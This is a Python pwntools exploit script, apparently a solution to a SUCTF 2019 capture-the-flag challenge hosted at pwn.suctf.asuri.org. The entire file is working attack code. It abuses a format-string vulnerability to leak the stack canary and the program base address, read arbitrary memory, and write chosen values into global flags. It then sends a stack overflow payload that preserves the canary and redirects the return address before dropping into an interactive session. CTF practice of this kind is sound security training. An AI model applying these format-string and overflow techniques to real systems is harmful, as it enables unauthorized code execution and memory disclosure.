from pwn import *
sh = remote("pwn.suctf.asuri.org", 20001)
#context.log_level='debug'
sh.recvuntil("password:")
sh.send("123456\n")
sh.recvuntil("cmd:")

#13->leak img base
def leak_stack():
	for i in xrange(0,32):
		sh.send("%" + str(i) + "$.16lx" + "\n")
		sh.recvuntil("cmd:")
		leak = sh.recvuntil("cmd:")
		leak = leak[:leak.find("\n")]
		print leak

#11->canary
def leak_canary():
	sh.send("%11$lx\n")
	sh.recvuntil("cmd:")
	leak = sh.recvuntil("cmd:")
	leak = leak[:leak.find("\n")]
	return int(leak, 16)

def find_base():
	sh.send("%13$lx\n")
	sh.recvuntil("cmd:")
	leak = sh.recvuntil("cmd:")
	leak = leak[:leak.find("\n")]
	leak = int(leak, 16)
	assert (leak & 0xfff) == 0x1bd
	leak = leak - 0x1bd
	i = 0
	while True:
		string = read_string(leak - i)
		print string
		if string[:4] == "\x7fELF":
			print i
			break;
		i += 0x1000

def get_base():
	sh.send("%13$lx\n")
	sh.recvuntil("cmd:")
	leak = sh.recvuntil("cmd:")
	leak = leak[:leak.find("\n")]
	leak = int(leak, 16)
	assert (leak & 0xfff) == 0x1bd
	leak = leak - 0x1bd
	return leak - 0x1000

SIGN_STR = "201920192019"
def read_string(addr):
	payload = "%8$s" + SIGN_STR + p64(addr)
	sh.send(payload + "\n")
	sh.recvuntil("cmd:")
	ret = sh.recvuntil("cmd:")
	return ret[:ret.find(SIGN_STR)]


def tohex(string):
	return ''.join(x.encode('hex') for x in string)
def dump_section(addr_beg, size):
	ret = ""
	p = addr_beg
	while p < addr_beg + size:
		if (p & 0xff) == 0x0A:
			ret += "\x20\x19\x20\x19\x20\x19\x20\x19"
			p += 1
		else:
			output = read_string(p)
			length = len(output)
			ret += output
			ret += "\x00"
			p += length + 1
		print tohex(ret)
		#print ret
	return ret


def qword_zero(addr):
	payload = "%7$n%8$n"
	payload += p64(addr)
	payload += p64(addr + 4)
	sh.send(payload + "\n")
	sh.recvuntil("cmd:")
	sh.recvuntil("cmd:")

def qword_one(addr):
	payload = "%7$p%7$n"
	payload += p64(addr)
	sh.send(payload + "\n")
	sh.recvuntil("cmd:")
	sh.recvuntil("cmd:")


base = get_base()
canary = leak_canary()
_start = base + 0x8A0
print hex(base)
print hex(canary)
#dump_section(_start, 0x2A)

main = _start + 36 + 0x0892
print "main: " + hex(main)
plt = base + 0x700
got = base + 0x2030c0
#dump_section(plt, 0x80)

resolve_got = base + 0x203010
vuln_func = base + 0xC2B
#dump_section(resolve_got, 8)
#dump_section(vuln_func, 0x800)
test_string = base + 0x20ef
printf_plt = base + 0x830
printf_got = printf_plt + 6 + 0x202802
#print "fake got " + hex(got)
#print "leaking " + hex(printf_got)
#dump_section(printf_got-0x20, 0x40)
#libc6_2.23-0ubuntu10_amd64.so

#dump_section(plt, 0x2000 - 0x700)
#dump all text


# v2 = MEMORY[0x2030C0]
#   && MEMORY[0x2030C4]
#   && !MEMORY[0x2030C8]
#   && !MEMORY[0x2030CC]
#   && MEMORY[0x2030D4]
#   && !MEMORY[0x2030D8];
# MEMORY[0x2030E0] = v2;
# MEMORY[0x2030E4] = MEMORY[0x2030DC];

#dump_section(base + 0x2030C0, 32)
qword_zero(base + 0x2030D0)
qword_one(base + 0x2030C0)
qword_one(base + 0x2030C4)
payload = "%7$p%7$n"
payload += p64(base + 0x2030D4)
sh.send(payload + "\n")

# qword_one(base + 0x2030D4)
# qword_zero(base + 0x2030C8)
# qword_zero(base + 0x2030CC)
# qword_zero(base + 0x2030D8)
# qword_zero(base + 0x2030DC)
sh.recvuntil("Tell me your name:")
sh.send("2019\n")
sh.recvuntil("me what do you want?\n")
sh.send(34 * "A" + p64(canary) + p64(0) + p64(base + 0x9AA) + "\n")


sh.interactive()
